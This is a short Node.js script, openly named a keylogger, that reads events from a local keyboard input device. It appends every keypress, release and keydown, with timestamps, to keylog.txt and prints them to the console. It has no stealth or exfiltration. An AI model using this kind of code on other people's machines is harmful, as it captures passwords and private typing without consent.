

const fs = require('fs');
const Keyboard = require('./keyboard');

const keyboard = new Keyboard('event0'); 

const logFile = 'keylog.txt';
const logStream = fs.createWriteStream(logFile, { flags: 'a' });

keyboard.on('keypress', (event) => {
  const logMessage = `Key pressed: ${event.keyId} (code: ${event.keyCode}) at ${event.timeS}.${event.timeMS}\n`;
  console.log(logMessage);
  logStream.write(logMessage);
});

keyboard.on('keyup', (event) => {
  const logMessage = `Key released: ${event.keyId} (code: ${event.keyCode}) at ${event.timeS}.${event.timeMS}\n`;
  console.log(logMessage);
  logStream.write(logMessage);
});

keyboard.on('keydown', (event) => {
  const logMessage = `Key down: ${event.keyId} (code: ${event.keyCode}) at ${event.timeS}.${event.timeMS}\n`;
  console.log(logMessage);
  logStream.write(logMessage);
});

console.log(`Keylogger started. Logging to ${logFile}`);
